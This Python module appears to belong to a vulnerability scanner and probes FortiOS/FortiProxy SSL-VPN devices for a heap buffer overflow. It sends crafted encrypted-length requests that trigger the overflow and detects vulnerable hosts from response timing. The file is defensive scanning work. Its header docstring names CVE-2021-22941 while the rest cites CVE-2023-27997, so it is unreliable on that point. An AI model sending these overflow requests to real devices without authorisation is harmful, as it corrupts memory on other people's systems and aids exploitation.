"""Agent Asteroid implementation for CVE-2021-22941"""
import hashlib
import re
import struct
from typing import Any

import numpy as np
import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions
from scipy import stats

from agent import definitions

DEFAULT_TIMEOUT = 90
REQUESTS_PER_GROUP = 400


def _gen_enc_hdr(salt: bytes, l: int) -> str:
    magic = b"GCC is the GNU Compiler Collection."
    ks = hashlib.md5(salt + b"00bfbfbf" + magic).digest()
    length = struct.pack("<H", l)
    return "00bfbfbf{:02x}{:02x}".format(length[0] ^ ks[0], length[1] ^ ks[1])


def _make_request(
    session: requests.Session, baseurl: str, salt: bytes, allocsize: int, reqsize: int
) -> requests.Response:
    payload = _gen_enc_hdr(salt, reqsize) + "41" * allocsize
    payload = "ajax=1&username=test&realm=&enc=" + payload
    req = session.post(
        baseurl + "/remote/hostcheck_validate",
        headers={"content-type": "application/x-www-form-urlencoded"},
        verify=False,
        data=payload,
    )
    return req


def _reject_outliers(data: list[int]) -> list[int]:
    # This rejects ~25% of responses, but gives us much better sensitivity by filtering out random spikes in latency
    q3 = np.quantile(data, 0.75)
    return list(filter(lambda x: x <= q3, data))


def _check_stats(regular: list[int], overflow: list[int]) -> tuple[int, int, Any]:
    overflow = _reject_outliers(overflow)
    regular = _reject_outliers(regular)
    t_stat = stats.ttest_ind(overflow, regular, equal_var=False)
    return len(overflow), len(regular), t_stat


class Exploit(definitions.BaseExploit):
    """
    CVE: CVE-2021-22941
    """

    def __init__(self, target: str):
        self.target = target

    @property
    def vulnerability_title(self) -> str:
        return "A heap-based buffer overflow vulnerability in FortiOS"

    @property
    def vulnerability_reference(self) -> str:
        return "CVE-2023-27997"

    @property
    def vulnerability_description(self) -> str:
        return (
            "A heap-based buffer overflow vulnerability [CWE-122] in FortiOS version 7.2.4 and below, "
            "version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy "
            "version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, "
            "version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands "
            "via specifically crafted requests."
        )

    def accept(self) -> bool:
        try:
            req = requests.get(self.target + "/remote/info", verify=False)
            reg = re.compile("salt='([0-9a-f]{8})'")
            matches = reg.findall(req.text)
        except requests_exceptions.RequestException:
            return False
        return len(matches) == 1

    def check(self) -> list[definitions.Vulnerability]:
        r = requests.get(self.target + "/remote/info", verify=False)
        reg = re.compile("salt='([0-9a-f]{8})'")
        matches = reg.findall(r.text)
        salt = matches[0].encode()

        # allocations of size 0xe000+1-0x10000 are all in the same size class
        # we leave a 2KiB gap after our allocation but before the next chunk,
        # so vulnerable devices will only corrupt unused memory
        alloc_size = 0xF800

        overflow = []
        regular = []
        s = requests.Session()

        for i in range(REQUESTS_PER_GROUP):
            req1 = _make_request(s, self.target, salt, alloc_size, alloc_size + 0xF0)
            overflow.append(req1.elapsed.microseconds)

            req2 = _make_request(s, self.target, salt, alloc_size, alloc_size // 2)
            regular.append(req2.elapsed.microseconds)

            if i > 20 and i % 10 == 0:
                nr, no, t = _check_stats(regular, overflow)
                if nr > 20 and no > 20 and t.pvalue < 0.001:
                    break
        _, _, t_stat = _check_stats(regular, overflow)

        if t_stat.pvalue > 0.001 or (-2 < t_stat.statistic < 2):
            return []

        if t_stat.statistic < -0.5:
            return []
        elif t_stat.statistic > 0.5:
            vulnerability = self.generate_vulnerability_object()
            return [vulnerability]
        else:
            return []

    def generate_vulnerability_object(self) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=self.vulnerability_title,
            risk_rating="HIGH",
            short_description=self.vulnerability_description,
            description=self.vulnerability_description,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{self.vulnerability_reference}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=False,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=False,
        )
        technical_detail = f"{self.target} is vulnerable to {self.vulnerability_reference}, {self.vulnerability_title}"
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
        )
        return vulnerability
